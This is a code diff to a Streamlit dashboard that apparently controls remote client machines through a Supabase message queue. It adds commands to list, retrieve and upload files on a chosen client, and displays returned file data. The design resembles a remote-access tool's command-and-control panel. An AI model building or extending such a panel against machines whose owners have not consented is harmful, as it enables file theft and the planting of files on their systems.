@@ -6,6 +6,7 @@ import base64
 from PIL import Image
 import io
 import time
+import json
 
 # Initialize Supabase
 supabase = create_client(
@@ -89,7 +90,6 @@ def send_command(client_id: str, command: str):
             "type": "command",
             "content": command,
             "status": "pending",
-           
         }
         supabase.table('messages').insert(data).execute()
         return True
@@ -160,10 +160,49 @@ def render_dashboard():
         # File Manager
         with tabs[2]:
             st.header("File Manager")
-            uploaded_file = st.file_uploader("Upload File", type=['txt', 'pdf', 'zip'])
-            if uploaded_file is not None:
-                if st.button("Send File"):
-                    st.info("File transfer feature coming soon!")
+            fm_tabs = st.tabs(["List Files", "Download File", "Upload File"])
+            
+            # List Files Section
+            with fm_tabs[0]:
+                st.subheader("List Files")
+                directory = st.text_input("Directory", value=".")
+                if st.button("List Files"):
+                    command = f"file list {directory}"
+                    if send_command(selected_client, command):
+                        st.success("List Files command sent!")
+            
+            # Download File Section
+            with fm_tabs[1]:
+                st.subheader("Download File")
+                filepath = st.text_input("File path to download")
+                if st.button("Download File"):
+                    command = f"file get {filepath}"
+                    if send_command(selected_client, command):
+                        st.success("Download command sent! Check Message History for file data.")
+                        
+                # Optionally, if you have already received a file message,
+                # you can add a download button after decoding the message.
+                # (This requires additional code to detect and render file messages.)
+            
+            # Upload File Section
+            with fm_tabs[2]:
+                st.subheader("Upload File")
+                uploaded_file = st.file_uploader("Choose a file to upload")
+                destination = st.text_input("Destination path on client", value="C:/destination/" )
+                if st.button("Upload File"):
+                    if uploaded_file and destination:
+                        file_bytes = uploaded_file.read()
+                        file_b64 = base64.b64encode(file_bytes).decode()
+                        # Prepare a JSON payload with destination and file content
+                        payload = json.dumps({
+                            "destination": destination + uploaded_file.name,
+                            "content": file_b64
+                        })
+                        command = f"file upload {payload}"
+                        if send_command(selected_client, command):
+                            st.success("Upload command sent!")
+                    else:
+                        st.error("Please select a file and specify a destination.")
         
         # Message History
         with tabs[3]:
@@ -187,6 +226,16 @@ def render_dashboard():
                             img = decode_image(msg['content'])
                             if img:
                                 st.image(img)
+                        elif msg['type'] == 'file':
+                            # For file messages, assume the content is a JSON payload.
+                            try:
+                                file_info = json.loads(msg['content'])
+                                filename = file_info.get("filename", "downloaded_file")
+                                file_b64 = file_info.get("content", "")
+                                file_bytes = base64.b64decode(file_b64)
+                                st.download_button("Download File", file_bytes, file_name=filename)
+                            except Exception as e:
+                                st.error(f"Error processing file message: {e}")
                         st.text(f"Status: {msg['status']}")
 
 def main():
